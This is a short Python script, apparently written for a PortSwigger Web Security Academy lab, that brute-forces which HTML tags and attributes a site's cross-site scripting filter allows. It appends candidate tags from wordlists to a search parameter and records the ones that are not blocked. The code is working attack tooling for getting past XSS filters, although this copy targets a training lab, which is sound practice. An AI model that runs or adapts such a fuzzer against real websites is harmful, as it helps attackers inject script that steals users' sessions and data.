import requests as rq

target_url = 'https://0ad800c003fb6d4c8306b537006900ab.web-security-academy.net/?search='
payload = ""

# # Brute-force tags
# with open('tags_lst.txt', 'r') as tag_file:
#     for line in tag_file:
#         payload = "'</h1><" + line.strip() + ">"
#         print(target_url + payload)
#         r = rq.get(url=target_url + payload)
#         if(r.text != '"Tag is not allowed"'):
#             print('[+] Tag found!')
#             with open('found_tag.txt', 'a') as tag_write:
#                 tag_write.writelines(line)

# Brute-force attribute
tag = open('found_tag.txt', 'r').readline()
with open('attr_lst.txt', 'r') as attr_file:
    for line in attr_file:
        payload = "'</h1><" + tag.strip() + " " + line.strip() + "=''>"
        print(payload)
        r = rq.get(url=target_url + payload)
        # print(r.text)
        if(r.text != '"Attribute is not allowed"'):
            print("[+] Attribute found!")
            with open('found_attr.txt', 'a') as attr_write:
                attr_write.writelines(line)